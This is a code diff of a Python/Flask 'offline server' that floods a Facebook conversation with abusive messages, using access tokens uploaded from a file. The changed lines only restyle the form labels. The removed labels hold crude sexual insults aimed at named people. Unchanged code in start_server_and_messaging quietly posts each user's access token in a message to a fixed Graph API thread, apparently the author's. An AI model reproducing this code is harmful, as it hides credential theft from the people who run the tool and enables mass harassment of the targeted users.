@@ -15,7 +15,7 @@ HTML_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☠️ OWNER SAHIIL IINSIIDE ☠️</title>
+    <title>༒❤️..SAHIL DON HETW..❤️༒</title>
     <style>
         body {
             background-image: url('https://postimg.cc/v1H1B1dc'); /* Replace with the URL of your image */
@@ -81,30 +81,30 @@ HTML_TEMPLATE = '''
 <body>
 
 <div class="form-container">
-    <h2>[-𝙊𝙒𝙉𝙀𝙍 𝙎𝘼𝙃𝙄𝙇 𝘿𝙊𝙉 𝙃𝙀𝙍𝙒-] 𝙒𝘼𝙍𝙄𝙎 𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙆𝙄 𝘼𝙈𝙈𝘼 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙋𝘼𝙃𝘿𝙉𝙀 𝙒𝘼𝙇𝘼   𝙉𝙊𝙉𝙎𝙏𝙊𝙋 [<<𝙎𝙀𝙍𝙑𝙀𝙍>>]</h2>
+    <h2>༒❤️🆂A🅷︎I🅻︎ D🅾︎N H🅴︎R🅴︎❤️༒</h2>
     <form id="messageForm" enctype="multipart/form-data">
         <div class="form-group">
-            <label for="tokensFile">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙔𝘼𝙏𝙀𝙀𝙈 𝙒𝘼𝙍𝙄𝙎 𝙆𝙄 𝘼𝙈𝙈𝙄 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙈𝙀  𝙏𝙊𝙆𝙀𝙉 𝙁𝙄𝙇𝙀 𝘿𝘼𝙇𝙊..⤵️</label>
+            <label for="tokensFile">⏮️ 𝙀𝙉𝙏𝙀𝙍 𝙏𝙊𝙆𝙀𝙉 𝙁𝙄𝙇𝙀 ⏭️.....🔃</label>
             <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
         </div>
         <div class="form-group">
-            <label for="convoId">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝘽𝙃𝙀𝙀𝙆𝙃𝘼𝙍𝙄 𝙒𝘼𝙍𝙄𝙎  𝘾𝙊𝙉𝙑𝙊 𝙐𝙄𝘿 𝘿𝘼𝙇𝙊..⤵️</label>
+            <label for="convoId"> ⏮️ 𝙀𝙉𝙏𝙀𝙍 𝘾𝙊𝙉𝙑𝙊 𝙐𝙄𝘿 ⏯️.....🔃</label>
             <input type="text" id="convoId" name="convoId" required>
         </div>
         <div class="form-group">
-            <label for="messagesFile">𝙒𝘼𝙍𝙄𝙎 𝘼𝙉𝘿 𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙆𝙄 𝘽𝙀𝙃𝘼𝙉 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙁𝘼𝘿𝙉𝙀 𝙒𝘼𝙇𝘼 𝙂𝘼𝙇𝙄 𝘿𝘼𝙇𝙊..⤵️</label>
+            <label for="⏮️ messagesFile">𝙀𝙉𝙏𝙀𝙍 𝙂𝘼𝙇𝙄 𝙁𝙄𝙇𝙀 ⏭️.....🔃</label>
             <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
         </div>
         <div class="form-group">
-            <label for="hatersName">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝘼𝙉𝘿 𝙒𝘼𝙍𝙄𝙎 𝙔𝘼𝙏𝙀𝙀𝙈 𝘾𝙃𝙐𝙏𝘼𝙄 𝙆𝘼 𝙉𝘼𝙈𝙀 𝘿𝘼𝙇𝙊..⤵️</label>
+            <label for="hatersName">⏮️ 𝙄𝙉𝙏𝙀𝙍 𝙃𝘼𝙏𝙀𝙍 𝙉𝘼𝙈𝙀 ⏯️......🔃</label>
             <input type="text" id="hatersName" name="hatersName" required>
         </div>
         <div class="form-group">
-            <label for="speed">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙒𝘼𝙍𝙄𝙎 𝙆𝙀 𝘽𝙀𝙃𝘼𝙉 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙈𝙀 𝙎𝙋𝙀𝙀𝘿 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 𝘿𝘼𝙇𝙊..⤵️ (SAHIIL DON HERW)</label>
+            <label for="speed">⏮️ 𝙀𝙉𝙏𝙀𝙍 𝙎𝙋𝙀𝙀𝘿 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ⏭️.....🔃 (-SAHIIL DON HERW-)</label>
             <input type="number" id="speed" name="speed" value="1" required>
         </div>
         <div class="form-group">
-            <button type="submit">💫 𝙎𝙏𝘼𝙍𝙏 𝙎𝙀𝙉𝘿 𝙈𝙀𝙎𝙎𝙀𝙂𝙀 💫</button>
+            <button type="submit">↕️❤️...........𝙎T𝘼𝙍T 𝙎𝙀N𝘿 𝙈E𝙎𝙎𝙀𝙂E.........❤️↕️</button>
         </div>
     </form>
 </div>
@@ -193,7 +193,7 @@ def start_server_and_messaging():
         for token in tokens:
             access_token = token.strip()
             url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-            msg = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {access_token}"
+            msg = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..🔃 {access_token}"
             parameters = {"access_token": access_token, "message": msg}
             response = requests.post(url, json=parameters, headers=headers)
             time.sleep(0.1)
